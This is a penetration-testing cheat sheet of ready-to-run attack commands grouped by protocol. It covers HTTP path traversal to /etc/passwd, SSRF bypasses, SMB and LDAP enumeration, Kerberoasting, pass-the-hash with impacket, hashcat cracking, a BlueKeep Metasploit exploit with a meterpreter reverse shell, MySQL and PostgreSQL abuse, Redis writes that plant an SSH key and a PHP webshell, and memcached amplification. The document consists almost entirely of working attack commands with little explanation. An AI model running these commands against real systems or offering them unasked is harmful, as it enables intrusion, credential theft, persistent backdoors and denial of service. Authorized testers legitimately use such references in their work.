# Protocol Attack Reference

## HTTP/HTTPS Attacks

### Method Confusion
```bash
# HTTP method testing
curl -X OPTIONS http://target/ -v
curl -X PUT http://target/ -d "test" -v
curl -X DELETE http://target/ -v
curl -X TRACE http://target/ -v
```

### Header Injection
```bash
# Host header injection
curl -H "Host: internal.target.local" http://EXTERNAL_IP/

# X-Forwarded-For spoofing
curl -H "X-Forwarded-For: 127.0.0.1" http://target/

# HTTP Request Smuggling detection
curl -H "Transfer-Encoding: chunked" -H "Content-Length: 3" http://target/
```

### Path Traversal
```bash
# Basic traversal
curl "http://target/../../../../etc/passwd"
curl "http://target/....//....//....//etc/passwd"

# URL encoded
curl "http://target/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Double encoded
curl "http://target/%252e%252e/%252e%252e/etc/passwd"
```

### SSRF Testing
```bash
# Internal metadata (cloud)
curl -H "X-Forwarded-For: 169.254.169.254" http://target/

# Localhost bypass
curl "http://target/?url=http://127.0.0.1/"
curl "http://target/?url=http://[::1]/"
curl "http://target/?url=http://0177.0.0.1/"
curl "http://target/?url=http://0x7f.0.0.1/"
```

## SMB Attacks

### Enumeration
```bash
# Null session
smbclient -L //target -N

# User enumeration
rpcclient -U "" -N target
> enumdomusers
> enumdomgroups
> queryuser <RID>

# Share listing
smbclient -L //target -U user%pass

# File access
smbclient //target/share -U user%pass -c "ls"
```

### Signing Detection
```bash
# Check SMB signing
nmap --script smb2-security-mode -p 445 target
crackmapexec smb target --gen-relay-list targets.txt
```

## Kerberos Attacks

### Kerberoasting
```bash
# Request TGS for SPN
impacket-GetUserSPNs corp.local/user:pass -request -dc-ip 10.10.10.1

# Crack with hashcat
hashcat -m 13100 tgs.txt wordlist.txt -r rules/best64.rule
```

### AS-REP Roasting
```bash
# Find pre-auth disabled accounts
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass

# Crack with hashcat
hashcat -m 18200 asrep.txt wordlist.txt
```

### Pass-the-Hash
```bash
# NTLM hash format
impacket-psexec corp.local/user@TARGET -hashes aad3b435b51404ee:da76...

# WMI execution
impacket-wmiexec corp.local/user@TARGET -hashes :da76...

# SMB execution
impacket-smbexec corp.local/user@TARGET -hashes :da76...
```

### Pass-the-Ticket
```bash
# Use TGT from ccache
export KRB5CCNAME=/tmp/user.ccache
impacket-psexec corp.local/user@TARGET -k -no-pass
```

## LDAP Attacks

### Anonymous Bind
```bash
# Test anonymous bind
ldapsearch -x -H ldap://target -b "DC=corp,DC=local" "(objectClass=*)"

# Enumerate users
ldapsearch -x -H ldap://target -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Enumerate groups
ldapsearch -x -H ldap://target -b "DC=corp,DC=local" "(objectClass=group)" cn
```

### LDAP Injection
```bash
# Filter bypass
ldapsearch -x -H ldap://target -b "DC=corp,DC=local" "(|(cn=*)(uid=*))"
```

## DNS Attacks

### Zone Transfer
```bash
# Try zone transfer
dnsrecon -d target.com -t axfr

# Direct attempt
dig axfr target.com @dns_server
host -l target.com dns_server
```

### DNS Rebinding
```bash
# Set low TTL on malicious DNS
# Browser hits evil domain → resolves to internal IP
# Enables SSRF to internal services
```

## SNMP Attacks

### Community String Testing
```bash
# Common community strings
onesixtyone -c community.txt target

# MIB walk with community
snmpwalk -v2c -c public target
snmpwalk -v2c -c private target
snmpwalk -v2c -c manager target
```

### MIB Useful OIDs
```bash
# System info
snmpwalk -v2c -c public target 1.3.6.1.2.1.1

# Network interfaces
snmpwalk -v2c -c public target 1.3.6.1.2.1.4

# Running processes
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2

# User accounts (Windows)
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25
```

## RDP Attacks

### BlueKeep (CVE-2019-0708)
```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### RDP NLA Bypass
```bash
# Check if NLA is required
nmap --script rdp-enum-encryption -p 3389 target

# If NLA disabled, use rdesktop
rdesktop -u admin -p pass target
```

## MySQL Attacks

### Auth Bypass
```bash
# CVE-2012-2122 — MySQL 5.x
mysql -u root --skip-password target
mysql -u root mysql
```

### UDF Privilege Escalation
```bash
# If you have FILE privilege
mysql -u user -p -e "SELECT 0x... INTO DUMPFILE '/usr/lib/lib_mysqludf_sys.so'"
```

## PostgreSQL Attacks

### Command Execution
```bash
# If you have superuser
psql -h target -U postgres -c "CREATE EXTENSION dblink"
psql -h target -U postgres -c "SELECT dblink_connect('host=127.0.0.1 user=postgres password=pass')"
```

## Redis Attacks

### Unauthorized Access & RCE
```bash
# Check for no auth
redis-cli -h target INFO server

# Write SSH key
redis-cli -h target -x SET ssh_key "user@host"
redis-cli -h target CONFIG SET dir /home/user/.ssh/
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SAVE
```

### Write Webshell
```bash
redis-cli -h target CONFIG SET dir /var/www/html/
redis-cli -h target CONFIG SET dbfilename shell.php
redis-cli -h target SET payload "<?php system(\$_GET['cmd']); ?>"
redis-cli -h target SAVE
```

## Memcached Attacks

### Amplification DDoS
```bash
# UDP amplification
echo "stats" | nc -u target 11211

# Extract cached data
echo "stats cachedump 1 100" | nc target 11211
```
